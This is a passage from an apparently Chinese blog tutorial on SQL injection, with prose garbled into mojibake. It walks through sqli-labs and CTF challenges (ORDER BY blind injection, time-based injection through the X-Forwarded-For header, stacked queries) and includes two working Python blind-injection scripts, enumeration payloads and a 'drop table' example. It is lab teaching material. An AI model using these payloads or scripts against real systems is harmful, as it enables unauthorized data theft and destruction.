select * from user order by id|&#123;select (select flag from level1_flag) regexp payload&#125;
flagåŒ¹é…æˆåŠŸå’Œ 1 â€œä¸â€ï¼ŒåŒ¹é…å¤±è´¥å’Œ 0 â€œä¸â€ã€‚         ï¼ˆé€ æˆä¸¤ç§ä¸åŒçš„æ’åºï¼‰</code></pre>



<h3 id="sqlilab-less48"><a href="#sqlilab-less48" class="headerlink" title="sqlilab-less48"></a>sqlilab-less48</h3><p>è¯·æ±‚ä¼ å…¥<code>sort</code>å˜é‡,è¿”å›ç»“æœä¸ºæŸ¥è¯¢çš„æ’åºåˆ—è¡¨;è¾“å…¥ä¸åŒæŸ¥è¯¢<code>sort</code>,è¿”å›ä¸åŒæŸ¥è¯¢æ’åºåˆ—è¡¨;</p>
<p><code>?sort=id</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210127133019.png" loading="lazy"></p>
<p><code>?sort=username</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210127132939.png" loading="lazy"></p>
<p>æ„é€ ç›²æ³¨è¯­å¥ï¼Œæ ¹æ®è¿”å›ä¸åŒçš„æ’åºåˆ—ï¼ŒçŒœè§£æ•°æ®ç»“æœå€¼ï¼›</p>
<p><code>?sort=id|(if((substr(database(),1,1)=&#39;s&#39;),1,2))</code>åŒ¹é…è¿”å›æ ‡å‡†æ’åºç»“æœ</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210127133432.png" loading="lazy"></p>
<p><code>?sort=id|(if((substr(database(),1,1)=&#39;a&#39;),1,2))</code>ä¸åŒ¹é…è¿”å›å¦å¤–çš„æ’åºç»“æœ</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210127133521.png" loading="lazy"></p>
<p>æ ¹æ®ä¸Šè¿°æƒ…å†µï¼Œç›´æ¥ç¼–å†™ç›²æ³¨è„šæœ¬ï¼š</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/localenv python3</span>
<span class="token comment"># -*- coding:utf-8 -*-</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys

url <span class="token operator">=</span> <span class="token string">"http://192.168.1.191:32769/Less-48/?sort=id"</span>
headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
	<span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 F,irefox/52.0'</span><span class="token punctuation">,</span>
	<span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span><span class="token punctuation">,</span>
	<span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'close'</span>
<span class="token punctuation">&#125;</span>
payloads <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
	<span class="token string">"dbname"</span><span class="token punctuation">:</span> <span class="token string">"|(if((ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;),1,2))"</span><span class="token punctuation">,</span>
	<span class="token string">"tbname"</span><span class="token punctuation">:</span> <span class="token string">"|(if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 2,1),&#123;&#125;,1))=&#123;&#125;),1,2))"</span><span class="token punctuation">,</span>
	<span class="token string">"clname"</span><span class="token punctuation">:</span> <span class="token string">"|(if((ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 2,1),&#123;&#125;,1))=&#123;&#125;),1,2))"</span><span class="token punctuation">,</span>
	<span class="token string">"clname"</span><span class="token punctuation">:</span> <span class="token string">"|(if((ascii(substr((select username from users limit 2,1),&#123;&#125;,1))=&#123;&#125;),1,2))"</span>
<span class="token punctuation">&#125;</span> 
		
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>	
	<span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		payload <span class="token operator">=</span> url <span class="token operator">+</span> payloads<span class="token punctuation">[</span><span class="token string">'clname'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span>
		<span class="token comment">#print(payload)</span>
		content1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span> headers <span class="token operator">=</span> headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
		content2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">=</span> payload<span class="token punctuation">,</span> headers <span class="token operator">=</span> headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
		<span class="token keyword">if</span> content1 <span class="token operator">==</span> content2<span class="token punctuation">:</span>
			sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>
			sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
			<span class="token keyword">break</span></code></pre>





<h1 id="insert-intoæ³¨å…¥"><a href="#insert-intoæ³¨å…¥" class="headerlink" title="insert intoæ³¨å…¥"></a>insert intoæ³¨å…¥</h1><h2 id="è¯­å¥åŸºç¡€"><a href="#è¯­å¥åŸºç¡€" class="headerlink" title="è¯­å¥åŸºç¡€"></a>è¯­å¥åŸºç¡€</h2><p>INSERT INTO è¯­å¥ç”¨äºå‘è¡¨ä¸­æ’å…¥æ–°è®°å½•ã€‚</p>
<h2 id="è¯­æ³•æ ¼å¼"><a href="#è¯­æ³•æ ¼å¼" class="headerlink" title="è¯­æ³•æ ¼å¼"></a>è¯­æ³•æ ¼å¼</h2><p>INSERT INTO è¯­å¥å¯ä»¥æœ‰ä¸¤ç§ç¼–å†™å½¢å¼ã€‚</p>
<p>ç¬¬ä¸€ç§å½¢å¼æ— éœ€æŒ‡å®šè¦æ’å…¥æ•°æ®çš„åˆ—åï¼Œåªéœ€æä¾›è¢«æ’å…¥çš„å€¼å³å¯ï¼š</p>
<pre class="language-none"><code class="language-none">INSERT INTO table_name
VALUES (value1,value2,value3,...);</code></pre>

<p>ç¬¬äºŒç§å½¢å¼éœ€è¦æŒ‡å®šåˆ—ååŠè¢«æ’å…¥çš„å€¼ï¼š</p>
<pre class="language-none"><code class="language-none">INSERT INTO table_name (column1,column2,column3,...)
VALUES (value1,value2,value3,...);</code></pre>



<h2 id="çœŸé¢˜æ¡ˆä¾‹"><a href="#çœŸé¢˜æ¡ˆä¾‹" class="headerlink" title="çœŸé¢˜æ¡ˆä¾‹"></a>çœŸé¢˜æ¡ˆä¾‹</h2><p>é¢˜ç›®ä¸º<code>Bugku</code>ä¸­çš„ä¸€é“<code>insert into</code>æ³¨å…¥é¢˜ã€‚</p>
<h3 id="é¢˜ç›®æºç "><a href="#é¢˜ç›®æºç " class="headerlink" title="é¢˜ç›®æºç "></a>é¢˜ç›®æºç </h3><p>é¢˜ç›®ä¸€å¼€å§‹ç»™å®šäº†æˆ‘ä»¬æºç ï¼Œå¹¶ä¸”<code>hint</code>ä¸­æç¤ºï¼šå†™ä¸€ä¸ª<code>python</code>è„šæœ¬å§!</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
	<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	 
	<span class="token keyword">function</span> <span class="token function-definition function">getIp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		  <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
		 <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	   <span class="token variable">$ip_arr</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">','</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	   <span class="token keyword">return</span> <span class="token variable">$ip_arr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	   
	<span class="token punctuation">&#125;</span>
	 
	<span class="token variable">$host</span><span class="token operator">=</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span>
	<span class="token variable">$user</span><span class="token operator">=</span><span class="token string double-quoted-string">"insert"</span><span class="token punctuation">;</span>
	<span class="token variable">$pass</span><span class="token operator">=</span><span class="token string double-quoted-string">"1234qwer"</span><span class="token punctuation">;</span>
	<span class="token variable">$db</span><span class="token operator">=</span><span class="token string double-quoted-string">"clientip"</span><span class="token punctuation">;</span>
	 
	<span class="token variable">$connect</span> <span class="token operator">=</span> <span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Unable to connect"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	 
	<span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Unable to select database"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	 
	<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">getIp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'your ip is :'</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token punctuation">;</span>
	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">;</span>
	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
	<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"insert into client_ip (ip) values ('<span class="token interpolation"><span class="token variable">$ip</span></span>')"</span><span class="token punctuation">;</span>
	<span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>
	<span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>



<h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>æ ¹æ®é¢˜ç›®ç»™å®šçš„æºç å¯ä»¥å‘ç°æ³¨å…¥ç‚¹åœ¨<code>http</code>å¤´çš„<code>x-forwarded-for</code>å¤„;</p>
<p>ä¸”é¢˜ç›®ä¸­è¿‡æ»¤é€—å·ï¼Œé‚£ä¹ˆå¸¸è§„çš„<code>update</code>å’ŒæŠ¥é”™æ³¨å…¥å’Œ<code>if</code>è¯­å¥éƒ½æ²¡æ³•ä½¿ç”¨;</p>
<p>è¿™é‡Œå¯ä»¥ä½¿ç”¨<code>select case when xxx then xxx else xxx end;</code>è¯­å¥æ¥ä»£æ›¿<code>if</code>è¯­å¥çš„ä½¿ç”¨;</p>
<p>é¢˜ç›®ä¸­è¿‡æ»¤äº†é€—å·ï¼Œ<code>substr</code>çš„ä¸­çš„é€—å·ï¼Œå¯ä»¥ä½¿ç”¨<code>from x for x</code>çš„æ–¹å¼æ¥æ›¿æ¢;</p>
<h3 id="çŸ¥è¯†å‚¨å¤‡"><a href="#çŸ¥è¯†å‚¨å¤‡" class="headerlink" title="çŸ¥è¯†å‚¨å¤‡"></a>çŸ¥è¯†å‚¨å¤‡</h3><p><code>select case xxx  when xxx then xxx else xxx end;</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210128093143.png" loading="lazy"></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210128094918.png" loading="lazy"></p>
<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>æ³¨å…¥ç‚¹æ˜¯åœ¨<code>http</code>å¤´çš„<code>x-forwarded-for</code>å¤„;</p>
<p>payload:<code>+&#39; and (select case  when (length(database())=8) then sleep(5) else 1 end) and &#39;1&#39;=&#39;1</code></p>
<p>å»¶æ—¶5ç§’å“åº”</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210128100811.png" loading="lazy"></p>
<p>payload:<code>+&#39; and (select case  when (length(database())=5) then sleep(5) else 1 end) and &#39;1&#39;=&#39;1</code></p>
<p>æ²¡æœ‰å»¶æ—¶ç›´æ¥å“åº”</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128104911961.png" alt="image-20210128104911961" loading="lazy"></p>
<p>æ ¹æ®ä¸Šè¯‰è¿”å›æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®é¡µé¢çš„å“åº”çš„æ—¶é—´ä¸é€šè¿‡ï¼Œå¯¹å…¶å†…å®¹è¿›è¡Œé€ä¸€çŒœè§£ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/localenv python3</span>
<span class="token comment"># -*- coding:utf-8 -*-</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys

URL <span class="token operator">=</span> <span class="token string">"http://192.168.1.191:32771/"</span>
PAYLOADS <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
	<span class="token string">"dbname"</span><span class="token punctuation">:</span> <span class="token string">"'+(select case  when (ascii(substr(database() from &#123;&#125; for 1))>&#123;&#125;) then sleep(3) else 1 end) and '1'='1"</span><span class="token punctuation">,</span>
	<span class="token string">"tbname"</span><span class="token punctuation">:</span> <span class="token string">"'+(select case  when (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1 offset 1) from &#123;&#125; for 1))>&#123;&#125;) then sleep(3) else 1 end) and '1'='1"</span><span class="token punctuation">,</span>
	<span class="token string">"clname"</span><span class="token punctuation">:</span> <span class="token string">"'+(select case  when (ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='flag' limit 1 offset 0) from &#123;&#125; for 1))>&#123;&#125;) then sleep(3) else 1 end) and '1'='1"</span><span class="token punctuation">,</span>
	<span class="token string">"clcontent"</span><span class="token punctuation">:</span> <span class="token string">"'+(select case  when (ascii(substr((select flag from flag) from &#123;&#125; for 1))>&#123;&#125;) then sleep(3) else 1 end) and '1'='1"</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">def</span> <span class="token function">get_url_request</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> final_payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">try</span><span class="token punctuation">:</span>
		result <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span> headers <span class="token operator">=</span> final_payload<span class="token punctuation">,</span> timeout <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>total_seconds<span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token keyword">except</span> TimeoutError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"è¯·æ±‚è¶…æ—¶ã€‚ã€‚ã€‚"</span><span class="token punctuation">)</span>
	<span class="token keyword">return</span> result

<span class="token comment"># äºŒåˆ†æ³•</span>
<span class="token keyword">def</span> <span class="token function">merge_serach</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token comment"># å®šä¹‰å¾ªç¯æ•°æ®åˆ—è¡¨</span>
	range_list <span class="token operator">=</span> <span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
	<span class="token builtin">min</span> <span class="token operator">=</span> <span class="token number">0</span>                               <span class="token comment">#ä»£è¡¨åˆ—è¡¨ä¸‹æ ‡çš„èµ·å§‹å€¼</span>
	<span class="token builtin">max</span> <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>range_list<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>             <span class="token comment">#ä»£è¡¨åˆ—è¡¨ä¸‹æ ‡çš„ç»“æŸå€¼</span>
	<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
		mid <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">max</span> <span class="token operator">+</span> <span class="token builtin">min</span><span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>            <span class="token comment">#è·å–åˆ—è¡¨ä¸‹æ ‡çš„ä¸­é—´å€¼</span>
		<span class="token comment">#å®šä¹‰æœ€ç»ˆpayloadæ ¼å¼</span>
		headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
			<span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 F,irefox/52.0'</span><span class="token punctuation">,</span>
			<span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span><span class="token punctuation">,</span>
			<span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'close'</span><span class="token punctuation">,</span>
			<span class="token string">'x-forwarded-for'</span><span class="token punctuation">:</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
		<span class="token punctuation">&#125;</span>
		final_payload <span class="token operator">=</span> headers
		<span class="token comment">#print(final_payload['x-forwarded-for'])</span>
		<span class="token comment"># åˆ¤æ–­é¡µé¢å“åº”æ—¶é—´è·å–å­—ç¬¦ç»“æœ</span>
		result <span class="token operator">=</span> get_url_request<span class="token punctuation">(</span>url<span class="token punctuation">,</span> final_payload<span class="token punctuation">)</span>
		<span class="token keyword">if</span> result <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">:</span>
			<span class="token builtin">min</span> <span class="token operator">=</span> mid
		<span class="token keyword">else</span><span class="token punctuation">:</span>
			<span class="token builtin">max</span> <span class="token operator">=</span> mid
		<span class="token keyword">if</span> <span class="token builtin">min</span> <span class="token operator">==</span> <span class="token builtin">max</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span>
			<span class="token keyword">if</span> result <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">:</span>
				<span class="token keyword">return</span> <span class="token builtin">max</span>
			<span class="token keyword">return</span> <span class="token builtin">min</span><span class="token operator">+</span><span class="token number">1</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>	
	<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>	
		payload <span class="token operator">=</span> PAYLOADS<span class="token punctuation">[</span><span class="token string">'clcontent'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token string">'&#123;&#125;'</span><span class="token punctuation">)</span>
		result <span class="token operator">=</span> merge_serach<span class="token punctuation">(</span>URL<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
		sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>
		sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
	
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p>
<h1 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h1><h2 id="å †å æ³¨å…¥åŸç†"><a href="#å †å æ³¨å…¥åŸç†" class="headerlink" title="å †å æ³¨å…¥åŸç†"></a>å †å æ³¨å…¥åŸç†</h2><p>å †å æ³¨å…¥å’Œ<code>uinon</code>è”åˆæ³¨å…¥æœ‰å¼‚æ›²åŒå·¥ä¹‹å¦™ï¼Œç”¨æ³•ç±»ä¼¼ï¼Œåªæ˜¯ä¸éœ€è¦å †å æ³¨å…¥ä½¿ç”¨çš„<code>ï¼›</code>ç»“æŸå‰é¢çš„<code>sql</code>è¯­å¥ï¼š</p>
<p>åœ¨ä½¿ç”¨<code>ï¼›</code>(åˆ†å·)ç»“æŸä¸€ä¸ª<code>sql</code>è¯­å¥åï¼Œå¯ä»¥ç»§ç»­æ„é€ ä¸‹ä¸€æ¡<code>sql</code>è¯­å¥ï¼›</p>
<p><code>select * from admin;drop table admin;</code>//æ‰§è¡Œè¿™ä¸ªè¯­å¥å…ˆæŸ¥è¯¢<code>admin</code>è¡¨å†…å®¹ï¼Œååˆ é™¤<code>admin</code>è¡¨ï¼›</p>
<h2 id="å †å æ³¨å…¥çš„ä¼˜ç¼ºç‚¹"><a href="#å †å æ³¨å…¥çš„ä¼˜ç¼ºç‚¹" class="headerlink" title="å †å æ³¨å…¥çš„ä¼˜ç¼ºç‚¹"></a>å †å æ³¨å…¥çš„ä¼˜ç¼ºç‚¹</h2><p>ä¼˜ç‚¹ï¼š</p>
<p>ä½¿ç”¨unionè”åˆæ³¨å…¥æ—¶ï¼Œé¡»ä¿è¯å‰åä¸¤ä¸ªsqlè¯­å¥çš„å¯æ˜¾ç¤ºå­—æ®µæ•°é‡è¦ç›¸åŒï¼Œä½¿ç”¨å †å æ³¨å…¥åˆ™ä¸éœ€è¦è€ƒè™‘è¿™ä¸ªé™åˆ¶ï¼Œå…¶å¯ä»¥æ‰§è¡Œä»»æ„è¯­å¥ï¼›</p>
<p>ç¼ºç‚¹ï¼š</p>
<p>å †å æ³¨å…¥å¹¶ä¸æ˜¯æ¯ä¸ªç¯å¢ƒä¸‹éƒ½å¯ä»¥æ‰§è¡Œï¼Œæœ‰å¯èƒ½ä¼šå—åˆ°apiæˆ–è€…æ•°æ®åº“å¼•æ“ä¸æ”¯æŒçš„é™åˆ¶ï¼›</p>
<p>ç›®å‰å·²çŸ¥æ”¯æŒå †å æ³¨å…¥çš„æœ‰ï¼š</p>
<table>
<thead>
<tr>
<th>asp</th>
<th>sql  server</th>
</tr>
</thead>
<tbody><tr>
<td>ASP.NET</td>
<td>SQL  SERVER</td>
</tr>
<tr>
<td>PHP</td>
<td>SQL  SERVER MYSQL</td>
</tr>
</tbody></table>
<h2 id="å †å æ³¨å…¥çš„åˆ©ç”¨-sqlilab-less38"><a href="#å †å æ³¨å…¥çš„åˆ©ç”¨-sqlilab-less38" class="headerlink" title="å †å æ³¨å…¥çš„åˆ©ç”¨(sqlilab-less38)"></a>å †å æ³¨å…¥çš„åˆ©ç”¨(sqlilab-less38)</h2><p>å¸¦å…¥å•å¼•å·ï¼Œæ•°æ®è¿”å›é”™è¯¯ä¿¡æ¯ï¼Œåˆ¤æ–­å½“å‰å­˜åœ¨æ³¨å…¥ç‚¹</p>
<p><code>http://192.168.2.220:8080/Less-38/?id=-1&#39;</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128145525282.png" alt="image-20210128145525282" loading="lazy"></p>
<p>ä½¿ç”¨<code>order by</code>åˆ¤æ–­å­—æ®µä½æ•°</p>
<p>å½“å¸¦å…¥çš„å€¼ä¸º3æ—¶ï¼Œé¡µé¢å“åº”æ­£å¸¸</p>
<p><code>http://192.168.2.220:8080/Less-38/?id=1&#39;order by 3--+</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128145613197.png" alt="image-20210128145613197" loading="lazy"></p>
<p>å½“å¸¦å…¥çš„å€¼ä¸º4æ—¶ï¼Œé¡µé¢å“åº”å¼‚å¸¸ï¼Œåˆ¤æ–­åˆ¤æ–­å½“å‰è¡¨ä¸­å­—æ®µé•¿åº¦ä¸º3</p>
<p><code>http://192.168.2.220:8080/Less-38/?id=1&#39;order by 4--+</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128145657274.png" alt="image-20210128145657274" loading="lazy"></p>
<p>ä½¿ç”¨è”åˆæŸ¥è¯¢è·å–æ‰€æœ‰åº“å</p>
<p><code>http://192.168.2.220:8080/Less-38/?id=-1&#39; union select 1,group_concat(schema_name),2 from information_schema.schemata --+</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128145734590.png" alt="image-20210128145734590" loading="lazy"></p>
<p>æ–°å¢åº“åˆ¤æ–­æ˜¯å¦å­˜åœ¨å †å æ³¨å…¥</p>
<p><code>http://192.168.2.220:8080/Less-38/?id=-1&#39;;create database duidietest--+</code></p>
<p>åˆ©ç”¨æŸ¥åº“é‡æ–°è·å–å½“å‰mysqlçš„æ‰€æœ‰åº“åï¼Œå‘ç°æ–°å¢åº“åæˆåŠŸï¼Œåˆ™åˆ¤æ–­æ˜¯å †å æ³¨å…¥</p>
<p><code>http://192.168.2.220:8080/Less-38/?id=-1&#39; union select 1,group_concat(schema_name),2 from information_schema.schemata --+</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128145837778.png" alt="image-20210128145837778" loading="lazy"></p>
<h2 id="çœŸé¢˜ç¯å¢ƒå¤ç°-å¼ºç½‘æ¯2019-éšä¾¿æ³¨"><a href="#çœŸé¢˜ç¯å¢ƒå¤ç°-å¼ºç½‘æ¯2019-éšä¾¿æ³¨" class="headerlink" title="çœŸé¢˜ç¯å¢ƒå¤ç°(å¼ºç½‘æ¯2019-éšä¾¿æ³¨)"></a>çœŸé¢˜ç¯å¢ƒå¤ç°(å¼ºç½‘æ¯2019-éšä¾¿æ³¨)</h2><h3 id="ç¯å¢ƒå¤ç°"><a href="#ç¯å¢ƒå¤ç°" class="headerlink" title="ç¯å¢ƒå¤ç°"></a>ç¯å¢ƒå¤ç°</h3><p><code>cd sql_injection_qw2019_stacked</code> </p>
<p><code>docker-compose up -d</code></p>
<h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>æäº¤æ¡†å¸¦å…¥å•å¼•å·ï¼Œè¿”å›æŠ¥é”™è¯­å¥ï¼Œåˆ¤æ–­å­˜åœ¨æ³¨å…¥ï¼›</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128154554855.png" alt="image-20210128154554855" loading="lazy"></p>
<p>ä½¿ç”¨orderå°è¯•å­—æ®µæ•°é‡çŒœè§£ï¼›</p>
<p><code>1&#39; order by 2#</code>è¿”å›æ­£å¸¸</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128161307478.png" alt="image-20210128161307478" loading="lazy"></p>
<p><code>1&#39; order by 3#</code>è¿”å›é”™è¯¯ï¼Œåˆ¤æ–­å­—æ®µæ•°é‡ä¸º2</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128161402835.png" alt="image-20210128161402835" loading="lazy"></p>
<p>å°è¯•ä½¿ç”¨<code>union select</code>è¯­å¥æ³¨å…¥å‡ºåº“å;</p>
<p><code>1&#39; union select 1,database()#</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128161507494.png" alt="image-20210128161507494" loading="lazy"></p>
